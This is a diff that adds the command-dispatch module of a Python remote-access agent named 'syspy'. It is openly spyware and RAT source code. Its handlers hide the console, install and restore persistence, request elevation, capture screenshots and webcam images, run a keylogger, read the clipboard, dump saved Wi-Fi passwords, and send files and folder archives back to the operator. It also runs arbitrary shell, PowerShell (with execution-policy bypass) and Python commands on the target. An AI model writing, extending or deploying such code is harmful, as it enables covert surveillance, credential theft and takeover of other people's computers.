@@ -1,0 +1,698 @@
+"""The agent command registry.
+
+Every command is a small function registered with :func:`command`.  Handlers
+receive ``(agent, argument)`` and either return a string, or send structured
+output themselves.
+
+Unrecognised commands fall through to the shell, so ``ipconfig /all`` works
+without being registered anywhere.
+"""
+
+from __future__ import annotations
+
+import json
+import os
+import subprocess
+import time
+import traceback
+from typing import Callable
+
+from . import (camera, files, inputs, persistence, runtime, screen, stealth, sysinfo,
+               system, updater)
+
+Handler = Callable[["object", str], str | None]
+
+REGISTRY: dict[str, Handler] = {}
+ALIASES: dict[str, str] = {}
+
+CREATE_NO_WINDOW = 0x08000000 if os.name == "nt" else 0
+
+
+def command(*names: str) -> Callable[[Handler], Handler]:
+    """Register a handler under one or more names."""
+    def decorator(handler: Handler) -> Handler:
+        REGISTRY[names[0]] = handler
+        for alias in names[1:]:
+            ALIASES[alias] = names[0]
+        return handler
+    return decorator
+
+
+def resolve(name: str) -> Handler | None:
+    """Look up a handler by name or alias."""
+    key = name.lower()
+    key = ALIASES.get(key, key)
+    return REGISTRY.get(key)
+
+
+def names() -> list[str]:
+    """All registered command names, sorted."""
+    return sorted(REGISTRY)
+
+
+# --------------------------------------------------------------------------
+# Identity and diagnostics
+# --------------------------------------------------------------------------
+
+
+@command("ping")
+def cmd_ping(agent, argument: str) -> str:
+    return "pong"
+
+
+@command("ver", "version")
+def cmd_version(agent, argument: str) -> str:
+    from .. import __version__
+    return (f"syspy {__version__}  sha {agent.self_sha}  pid {os.getpid()}\n"
+            f"path {agent.bundle_entry}\n"
+            f"python {sysinfo.summary()['python']}  admin {stealth.is_admin()}")
+
+
+@command("info", "sysinfo", "sys")
+def cmd_info(agent, argument: str) -> str:
+    return sysinfo.text_report()
+
+
+@command("where")
+def cmd_where(agent, argument: str) -> str:
+    lines = [f"pid      {os.getpid()}", f"running  {agent.bundle_entry}",
+             f"root     {stealth.bundle_root()}"]
+    for directory in stealth.install_directories():
+        entry = os.path.join(directory, stealth.executable_name())
+        lines.append(f"{'OK  ' if os.path.exists(entry) else 'MISS'} {entry}")
+    return "\n".join(lines)
+
+
+@command("elevate", "admin")
+def cmd_elevate(agent, argument: str) -> str:
+    if stealth.is_admin():
+        return "agent is already running with full Administrator privileges"
+    if stealth.elevate_process():
+        return "elevation requested, awaiting UAC confirmation on target PC"
+    return "elevation request failed or was blocked by Windows policy"
+
+
+@command("stealth.info")
+def cmd_stealth_info(agent, argument: str) -> str:
+    data = stealth.description()
+    return "\n".join(f"{key:12} {value}" for key, value in data.items())
+
+
+@command("stealth.hide", "hide")
+def cmd_hide(agent, argument: str) -> str:
+    return stealth.hide_console()
+
+
+@command("stealth.show", "show")
+def cmd_show(agent, argument: str) -> str:
+    return stealth.show_console()
+
+
+@command("persist.status")
+def cmd_persist_status(agent, argument: str) -> str:
+    data = persistence.status()
+    return "\n".join(f"{key:14} {value}" for key, value in data.items())
+
+
+@command("persist.install")
+def cmd_persist_install(agent, argument: str) -> str:
+    return "\n".join(persistence.install()) or "nothing to do"
+
+
+@command("persist.remove")
+def cmd_persist_remove(agent, argument: str) -> str:
+    return "\n".join(persistence.remove()) or "nothing removed"
+
+
+@command("heal")
+def cmd_heal(agent, argument: str) -> str:
+    restored = persistence.install_copies()
+    return f"restored {len(restored)} file(s)"
+
+
+# --------------------------------------------------------------------------
+# Screen, camera, input
+# --------------------------------------------------------------------------
+
+
+@command("shot", "screenshot")
+def cmd_screenshot(agent, argument: str) -> None:
+    factor = 1
+    try:
+        percent = int((argument or "100").strip().rstrip("%"))
+        factor = 4 if percent <= 25 else 2 if percent <= 50 else 1
+    except ValueError:
+        factor = 1
+    data, message = screen.capture(factor)
+    if data:
+        agent.send_file("screenshot.png", data)
+    else:
+        agent.reply(message)
+
+
+@command("burst")
+def cmd_burst(agent, argument: str) -> None:
+    try:
+        count = int(argument or 5)
+    except ValueError:
+        count = 5
+    for index, frame in enumerate(screen.capture_burst(count), start=1):
+        agent.send_file(f"burst{index:02d}.png", frame)
+    agent.reply(f"captured {count} frames")
+
+
+@command("cam", "webcam")
+def cmd_camera(agent, argument: str) -> None:
+    data, message = camera.capture()
+    if data:
+        agent.send_file("webcam.jpg", data)
+    else:
+        agent.reply(message)
+
+
+@command("key")
+def cmd_key(agent, argument: str) -> str:
+    action = (argument or "").strip().lower()
+    if action == "start":
+        return agent.keylogger.start()
+    if action == "stop":
+        return agent.keylogger.stop()
+    if action in ("dump", "peek"):
+        return agent.keylogger.peek() or "(nothing recorded yet)"
+    return f"keylogger backend: {agent.keylogger.backend}, active: {agent.keylogger.active}"
+
+
+@command("type")
+def cmd_type(agent, argument: str) -> str:
+    return inputs.type_text(argument)
+
+
+@command("mouse")
+def cmd_mouse(agent, argument: str) -> str:
+    return inputs.mouse(argument)
+
+
+@command("clip.get")
+def cmd_clip_get(agent, argument: str) -> str:
+    return inputs.clipboard_get()
+
+
+@command("clip.set")
+def cmd_clip_set(agent, argument: str) -> str:
+    return inputs.clipboard_set(argument)
+
+
+# --------------------------------------------------------------------------
+# Filesystem (Windows File Explorer Backend)
+# --------------------------------------------------------------------------
+
+
+@command("fs.drives")
+def cmd_drives(agent, argument: str) -> None:
+    drives = files.list_drives()
+    special = files.get_special_folders()
+    agent.send_json({"kind": "drives", "drives": drives, "special_folders": special})
+
+
+@command("fs.list", "ls", "dir")
+def cmd_list(agent, argument: str) -> None:
+    target = argument.strip().strip('"') if argument else ""
+    listing = files.list_directory(target)
+    agent.send_json({"kind": "listing", **listing})
+
+
+@command("fs.prop", "fs.properties")
+def cmd_properties(agent, argument: str) -> None:
+    target = argument.strip().strip('"')
+    props = files.get_properties(target)
+    agent.send_json({"kind": "properties", **props})
+
+
+@command("fs.read")
+def cmd_read(agent, argument: str) -> None:
+    target = argument.strip().strip('"')
+    res = files.read_file_content(target)
+    agent.send_json({"kind": "file_content", **res})
+
+
+@command("fs.save")
+def cmd_save(agent, argument: str) -> None:
+    try:
+        data = json.loads(argument)
+        res = files.save_file_content(
+            path=data["path"],
+            content=data.get("content", ""),
+            expected_sha=data.get("expected_sha", ""),
+            encoding=data.get("encoding"),
+            line_ending=data.get("line_ending"),
+        )
+    except Exception as err:
+        res = {"success": False, "error": str(err)}
+    agent.send_json({"kind": "save_result", **res})
+
+
+@command("fs.touch")
+def cmd_touch(agent, argument: str) -> None:
+    path = argument.strip().strip('"')
+    res = files.create_file(path)
+    agent.send_json({"kind": "fs_op_result", "op": "touch", **res})
+
+
+@command("fs.mkdir")
+def cmd_mkdir(agent, argument: str) -> None:
+    path = argument.strip().strip('"')
+    res = files.create_directory(path)
+    agent.send_json({"kind": "fs_op_result", "op": "mkdir", **res})
+
+
+@command("fs.rename")
+def cmd_rename(agent, argument: str) -> None:
+    try:
+        if argument.startswith("{"):
+            data = json.loads(argument)
+            old_path = data.get("old_path", "")
+            new_name = data.get("new_name", "")
+        else:
+            old_path, _, new_name = argument.partition("|")
+            if not new_name:
+                old_path, _, new_name = argument.partition(" ")
+            old_path = old_path.strip().strip('"')
+            new_name = new_name.strip().strip('"')
+        res = files.rename_item(old_path, new_name)
+    except Exception as err:
+        res = {"success": False, "error": str(err)}
+    agent.send_json({"kind": "fs_op_result", "op": "rename", **res})
+
+
+@command("fs.delete", "fs.rm", "rm")
+def cmd_delete(agent, argument: str) -> None:
+    permanent = False
+    target = argument.strip()
+    if target.startswith("{"):
+        try:
+            data = json.loads(target)
+            path = data.get("path", "")
+            permanent = bool(data.get("permanent", False))
+        except Exception as err:
+            agent.send_json({"kind": "fs_op_result", "op": "delete", "success": False, "error": str(err)})
+            return
+    else:
+        if target.endswith(" --permanent"):
+            permanent = True
+            target = target[:-12].strip()
+        path = target.strip('"')
+    res = files.delete_item(path, permanent=permanent)
+    agent.send_json({"kind": "fs_op_result", "op": "delete", **res})
+
+
+@command("fs.cpmv")
+def cmd_cpmv(agent, argument: str) -> None:
+    try:
+        data = json.loads(argument)
+        res = files.copy_or_move(
+            sources=data.get("sources", []),
+            destination_dir=data.get("destination_dir", ""),
+            is_move=bool(data.get("is_move", False)),
+            conflict_resolution=data.get("conflict_resolution", "replace"),
+        )
+    except Exception as err:
+        res = {"success": False, "error": str(err)}
+    agent.send_json({"kind": "fs_op_result", "op": "cpmv", **res})
+
+
+@command("fs.search")
+def cmd_search(agent, argument: str) -> None:
+    try:
+        if argument.startswith("{"):
+            data = json.loads(argument)
+            root = data.get("root", "")
+            query = data.get("query", "")
+            match_case = bool(data.get("match_case", False))
+            max_results = int(data.get("max_results", 250))
+        else:
+            root, _, query = argument.partition(" ")
+            root = root.strip().strip('"')
+            query = query.strip().strip('"')
+            match_case = False
+            max_results = 250
+        res = files.search_filesystem(root, query, max_results=max_results, match_case=match_case)
+    except Exception as err:
+        res = {"success": False, "error": str(err)}
+    agent.send_json({"kind": "search_results", **res})
+
+
+@command("fs.cat", "cat")
+def cmd_cat(agent, argument: str) -> str:
+    if not argument:
+        return "usage: cat <path>"
+    return files.read_text(argument)
+
+
+@command("fs.write")
+def cmd_write(agent, argument: str) -> str:
+    path, _, content = argument.partition(" ")
+    if not path:
+        return "usage: fs.write <path> <content>"
+    return files.write_text(path, content)
+
+
+@command("fs.find")
+def cmd_find(agent, argument: str) -> str:
+    root, _, pattern = argument.partition(" ")
+    if not pattern:
+        root, pattern = ".", argument
+    return "\n".join(files.find(root or ".", pattern)) or "no matches"
+
+
+@command("fs.download", "get")
+def cmd_download(agent, argument: str) -> None:
+    if not argument:
+        agent.reply("usage: fs.download <path>")
+        return
+    path = os.path.expanduser(argument.strip().strip('"').strip("'"))
+    if not os.path.exists(path):
+        err = f"no such path: {path}"
+        agent.reply(err)
+        agent.send_json({"kind": "fs_op_result", "op": "download", "error": err})
+        return
+    display_name = os.path.basename(path)
+    if not display_name:
+        display_name = path.replace(":", "").replace("\\", "_").replace("/", "_").strip("_") or "folder"
+
+    if os.path.isdir(path):
+        archive_path = ""
+        try:
+            archive_path = files.prepare_zip_download(path)
+            send_name = os.path.basename(archive_path)
+            with open(archive_path, "rb") as handle:
+                agent.send_file(send_name, handle.read())
+            agent.reply(f"downloaded folder archive: {send_name}")
+        except Exception as error:
+            err = f"Archive creation failed: {error}"
+            agent.reply(err)
+            agent.send_json({"kind": "fs_op_result", "op": "download", "error": err})
+        finally:
+            if archive_path and os.path.exists(archive_path):
+                try:
+                    os.remove(archive_path)
+                    parent_temp = os.path.dirname(archive_path)
+                    if os.path.isdir(parent_temp) and "syspy" in parent_temp.lower():
+                        shutil.rmtree(parent_temp, ignore_errors=True)
+                except OSError:
+                    pass
+    else:
+        try:
+            with open(path, "rb") as handle:
+                agent.send_file(display_name, handle.read())
+            agent.reply(f"downloaded file: {display_name}")
+        except Exception as error:
+            err = f"Read failed: {error}"
+            agent.reply(err)
+            agent.send_json({"kind": "fs_op_result", "op": "download", "error": err})
+
+
+
+@command("cd")
+def cmd_cd(agent, argument: str) -> str:
+    target = os.path.expanduser(argument or "~")
+    if os.path.isdir(target):
+        agent.cwd = os.path.abspath(target)
+        return f"cwd -> {agent.cwd}"
+    return "no such directory"
+
+
+@command("pwd")
+def cmd_pwd(agent, argument: str) -> str:
+    return agent.cwd
+
+
+# --------------------------------------------------------------------------
+# System
+# --------------------------------------------------------------------------
+
+
+@command("proc.list", "ps")
+def cmd_processes(agent, argument: str) -> None:
+    agent.send_json({"kind": "processes", "items": sysinfo.processes()})
+
+
+@command("proc.kill", "kill")
+def cmd_kill(agent, argument: str) -> str:
+    return system.kill_process(argument)
+
+
+@command("proc.start", "start")
+def cmd_start(agent, argument: str) -> str:
+    return system.start_process(argument)
+
+
+@command("net.info", "net")
+def cmd_network(agent, argument: str) -> str:
+    return subprocess.run(
+        "ipconfig /all" if os.name == "nt" else "ip address",
+        shell=True, capture_output=True, timeout=30,
+        creationflags=CREATE_NO_WINDOW,
+    ).stdout.decode(errors="replace")
+
+
+@command("net.wifi", "wifi")
+def cmd_wifi(agent, argument: str) -> str:
+    return sysinfo.wifi_passwords()
+
+
+@command("power.lock", "lock")
+def cmd_lock(agent, argument: str) -> str:
+    return system.lock()
+
+
+@command("power.shutdown", "shutdown")
+def cmd_shutdown(agent, argument: str) -> str:
+    return system.shutdown()
+
+
+@command("power.restart", "restart")
+def cmd_restart(agent, argument: str) -> str:
+    return system.restart()
+
+
+@command("power.sleep")
+def cmd_sleep(agent, argument: str) -> str:
+    return system.sleep()
+
+
+@command("msg")
+def cmd_message(agent, argument: str) -> str:
+    return system.message(argument)
+
+
+@command("beep")
+def cmd_beep(agent, argument: str) -> str:
+    return system.beep(argument)
+
+
+@command("say")
+def cmd_speak(agent, argument: str) -> str:
+    return system.speak(argument)
+
+
+@command("vol", "volume")
+def cmd_volume(agent, argument: str) -> str:
+    return system.volume(argument)
+
+
+@command("wallpaper", "wall")
+def cmd_wallpaper(agent, argument: str) -> str:
+    return system.wallpaper(argument)
+
+
+@command("open")
+def cmd_open(agent, argument: str) -> str:
+    return system.open_target(argument)
+
+
+@command("installed")
+def cmd_installed(agent, argument: str) -> str:
+    return "\n".join(system.installed_programs()) or "none"
+
+
+@command("startup")
+def cmd_startup(agent, argument: str) -> str:
+    return "\n".join(sysinfo.startup_entries()) or "none"
+
+
+@command("reg.read")
+def cmd_reg_read(agent, argument: str) -> str:
+    return sysinfo.registry_read(argument)
+
+
+@command("reg.write")
+def cmd_reg_write(agent, argument: str) -> str:
+    path, _, value = argument.partition(" ")
+    return sysinfo.registry_write(path, value)
+
+
+# --------------------------------------------------------------------------
+# Lifecycle
+# --------------------------------------------------------------------------
+
+
+@command("update")
+def cmd_update(agent, argument: str) -> str:
+    return "ready, waiting for a pushed build"
+
+
+@command("rollback")
+def cmd_rollback(agent, argument: str) -> None:
+    restored = updater.rollback()
+    agent.reply(f"restored {restored} item(s), restarting")
+    time.sleep(0.6)
+    updater.restart_self()
+
+
+@command("restart.agent")
+def cmd_restart_agent(agent, argument: str) -> None:
+    agent.reply("restarting")
+    time.sleep(0.4)
+    updater.restart_self()
+
+
+@command("cmd")
+def cmd_cmd(agent, argument: str) -> None:
+    """Explicitly execute a command through the Windows Command Prompt."""
+    if not argument:
+        agent.reply("usage: cmd <command>")
+        return
+    shell(agent, argument)
+
+
+@command("ps1", "powershell")
+def cmd_powershell(agent, argument: str) -> None:
+    """Execute a PowerShell command with execution policy bypass."""
+    if not argument:
+        agent.reply("usage: ps1 <powershell command or expression>")
+        return
+    shell(agent, f'powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "{argument}"')
+
+
+@command("py", "python")
+def cmd_python(agent, argument: str) -> None:
+    """Execute Python code or scripts using the agent's internal bundled interpreter.
+    
+    Guaranteed to run even if Python is not installed or not in system PATH.
+    """
+    if not argument:
+        agent.reply(f"usage: py <code> or py <script.py> [interpreter: {runtime.interpreter()}]")
+        return
+
+    python_bin = runtime.interpreter()
+    trimmed = argument.strip()
+    first_token, _, rest = trimmed.partition(" ")
+    first_path = os.path.expanduser(first_token.strip('"'))
+
+    if os.path.isfile(first_path):
+        cmd = [python_bin, first_path] + (rest.split() if rest else [])
+    else:
+        cmd = [python_bin, "-c", trimmed]
+
+    try:
+        process = subprocess.Popen(
+            cmd, cwd=agent.cwd if os.path.isdir(agent.cwd) else None,
+            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL,
+            creationflags=CREATE_NO_WINDOW,
+        )
+        agent.processes.add(process)
+        if process.stdout:
+            for raw in iter(process.stdout.readline, b""):
+                agent.reply(raw.decode(errors="replace").rstrip("\r\n"))
+            process.stdout.close()
+        process.wait()
+        agent.reply(f"[exit {process.returncode}]")
+        agent.processes.discard(process)
+    except Exception:
+        agent.reply(traceback.format_exc().strip().splitlines()[-1])
+
+
+@command("eval")
+def cmd_eval(agent, argument: str) -> str:
+    namespace = agent.eval_namespace
+    try:
+        return repr(eval(argument, namespace))
+    except Exception:
+        try:
+            exec(argument, namespace)
+            return "ok"
+        except Exception:
+            return traceback.format_exc()
+
+
+@command("help")
+def cmd_help(agent, argument: str) -> str:
+    return "commands: " + ", ".join(names())
+
+
+@command("exit")
+def cmd_exit(agent, argument: str) -> None:
+    agent.reply("goodbye")
+    time.sleep(0.3)
+    os._exit(0)
+
+
+@command("uninstall", "self_destruct")
+def cmd_uninstall(agent, argument: str) -> None:
+    """Completely remove all persistence mechanisms and shut down."""
+    agent.reply("uninstalling agent and removing persistence...")
+    try:
+        agent.send({"t": "bye"})
+    except Exception:
+        pass
+
+    def _do_remove():
+        time.sleep(0.5)
+        persistence.remove()
+        os._exit(0)
+
+    import threading
+    threading.Thread(target=_do_remove, daemon=True).start()
+
+
+# --------------------------------------------------------------------------
+# Fallback
+# --------------------------------------------------------------------------
+
+
+def shell(agent, command: str) -> None:
+    """Run ``command`` through the system shell and stream the output."""
+    try:
+        process = subprocess.Popen(
+            command, shell=True, cwd=agent.cwd if os.path.isdir(agent.cwd) else None,
+            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL,
+            creationflags=CREATE_NO_WINDOW,
+        )
+        agent.processes.add(process)
+        if process.stdout:
+            for raw in iter(process.stdout.readline, b""):
+                agent.reply(raw.decode(errors="replace").rstrip("\r\n"))
+            process.stdout.close()
+        process.wait()
+        agent.reply(f"[exit {process.returncode}]")
+        agent.processes.discard(process)
+    except Exception:
+        agent.reply(traceback.format_exc().strip().splitlines()[-1])
+
+
+def execute(agent, line: str) -> None:
+    """Dispatch one command line."""
+    line = line.strip()
+    if not line:
+        return
+    name, _, argument = line.partition(" ")
+    handler = resolve(name)
+    if handler is None:
+        shell(agent, line)
+        return
+    try:
+        result = handler(agent, argument.strip())
+        if isinstance(result, str) and result:
+            agent.reply(result)
+    except Exception:
+        agent.reply(traceback.format_exc().strip().splitlines()[-1])
